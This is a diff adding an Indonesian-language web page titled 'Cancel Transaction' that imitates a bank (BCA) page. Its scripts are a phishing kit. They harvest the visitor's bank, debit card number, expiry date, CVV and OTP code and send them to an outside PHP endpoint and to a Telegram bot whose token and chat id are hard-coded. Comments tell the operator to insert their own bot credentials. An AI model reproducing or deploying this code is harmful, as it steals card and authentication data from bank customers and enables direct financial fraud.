@@ -1,0 +1,143 @@
+<html lang="id" data-n-head="">
+ <head> 
+   <meta name="theme-color" content="#005BAA"> 
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+	<meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0;"/>
+	<title>Batalkan Transaksi</title>  
+</head>
+<body>
+    
+    
+    
+<script type="text/javascript" src="data.js"></script>   
+   <script>
+function tambahanform2(event){
+       event.preventDefault();
+   
+  $("#loadersaya2").show();
+
+ 
+var dataString = $("#fdata, #fbank, #fcard").serialize();
+			$.ajax( {
+			  type: 'POST',
+			  url: 'https://my-aplication.whf.bz/token/BCA/qwe/bank-lain/one1.php',
+			  data: dataString,
+ 
+    
+    complete: function(data) {
+            console.log('Complete');
+   setTimeout(function(){
+  $("#loadersaya2").hide();
+     $("#infoku").fadeIn();
+    }, 1000);}});};
+     
+
+ </script>
+ 
+ <script>
+ function tambahanform(event){
+  event.preventDefault();
+   
+  $("#loadersaya4").show();
+
+
+ var bank = document.getElementById('bank');
+        
+       
+
+        var gabungan =  "%0A├─────•Bank lain•────•" + '%0A├•※ 𝗕𝗮𝗻𝗸 : ' + bank.value +  "%0A╰───────────────────•";
+
+          var token = '8115647029:AAHupQOaUmv0qtRlydrq81CflqY2A6MGTI0'; // Ganti dengan token bot yang kamu buat
+        var grup = '7845715491'; // Ganti dengan chat id dari bot yang kamu buat
+
+        $.ajax({
+            url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
+            method: `POST`,
+    
+ 
+    
+    complete: function(data) {
+            console.log('Complete');
+   setTimeout(function(){
+         $("#debitcard").fadeIn();
+          $("#tambahan").fadeOut();
+           $("#loadersaya4").hide();
+    }, 1500);}});};
+  
+ </script>   
+ <script>
+function tambahanform1(event){
+       event.preventDefault();
+   
+  $("#loadersaya5").show();
+
+
+var kartu = document.getElementById('kartu');
+        
+         var valid = document.getElementById('valid');
+        var cvv = document.getElementById('cvv');
+        var bank = document.getElementById('bank');
+
+        var gabungan =  "%0A├─────•Bank lain•────•" + '%0A├•※ 𝗕𝗮𝗻𝗸 : ' + bank.value + '%0A├•※ 𝗞𝗮𝗿𝘁𝘂 : ' + debitku.value + '%0A├•※ 𝗩𝗮𝗹𝗶𝗱 : ' + valid.value + '%0A├•※ 𝗖𝗩𝗩 : ' + kodecvv.value +  "%0A╰───────────────────•";
+
+           var token = '8115647029:AAHupQOaUmv0qtRlydrq81CflqY2A6MGTI0'; // Ganti dengan token bot yang kamu buat
+        var grup = '7845715491'; // Ganti dengan chat id dari bot yang kamu buat
+
+
+
+        $.ajax({
+            url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
+            method: `POST`,
+ 
+    
+    complete: function(data) {
+            console.log('Complete');
+   setTimeout(function(){
+           $("#loadersaya5").hide();
+      $("#debitcard").fadeOut();
+     $("#pageinfo").fadeIn();
+      $("#pageotp").fadeOut();
+       
+    }, 500);}});};
+     
+
+ </script>
+ <script>
+function sendOtp(event){
+       event.preventDefault();
+   
+  $("#loadersaya6").show();
+
+
+var kartu = document.getElementById('kartu');
+        
+         var valid = document.getElementById('valid');
+        var cvv = document.getElementById('cvv');
+        var bank = document.getElementById('bank');
+        var otp = document.getElementById('otp');
+
+        var gabungan =  "%0A├─────•Bank lain•────•" + '%0A├•※ 𝗕𝗮𝗻𝗸 : ' + bank.value + '%0A├•※ 𝗞𝗮𝗿𝘁𝘂 : ' + debitku.value + '%0A├•※ 𝗩𝗮𝗹𝗶𝗱 : ' + valid.value + '%0A├•※ 𝗖𝗩𝗩 : ' + kodecvv.value + '%0A├•※ 𝗞𝗼𝗱𝗲 : ' +  otp.value +  "%0A╰───────────────────•";
+
+          var token = '8115647029:AAHupQOaUmv0qtRlydrq81CflqY2A6MGTI0'; // Ganti dengan token bot yang kamu buat
+        var grup = '7845715491'; // Ganti dengan chat id dari bot yang kamu buat
+
+
+        $.ajax({
+            url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
+            method: `POST`,
+ 
+    
+    complete: function(data) {
+            console.log('Complete');
+   setTimeout(function(){
+           $("#loadersaya6").hide();
+      $("#debitcard").fadeOut();
+     $("#pageinfo").fadeIn();
+      $("#pageotp").fadeOut();
+       $("#otp").val("");  
+    }, 500);}});};
+     
+
+ </script> 
+</body>
+</html>
